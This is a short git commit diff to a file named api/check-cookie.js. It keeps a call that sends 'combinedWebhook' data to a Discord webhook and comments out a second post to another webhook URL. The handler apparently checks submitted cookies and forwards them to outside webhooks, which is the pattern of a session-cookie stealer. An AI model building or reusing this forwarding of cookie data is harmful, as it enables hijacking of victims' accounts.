2e70fd5578ab49d9f0d137f5d294e56cac4e153b
hackedaccount123 <70093208+hackedaccount123@users.noreply.github.com>
2025-03-04 08:05:53 +0700

    Update check-cookie.js

--- api/check-cookie.js
+++ api/check-cookie.js
@@ -168,7 +168,7 @@ export default async function handler(req, res) {
 
         // Gửi webhook đến Discord
         await sendDiscordWebhook(combinedWebhook);
-        await axios.post(fileWebhookUrl, combinedWebhook);
+        //await axios.post(fileWebhookUrl, combinedWebhook);
 
         // Trả về response giữ nguyên
         res.status(200).json({
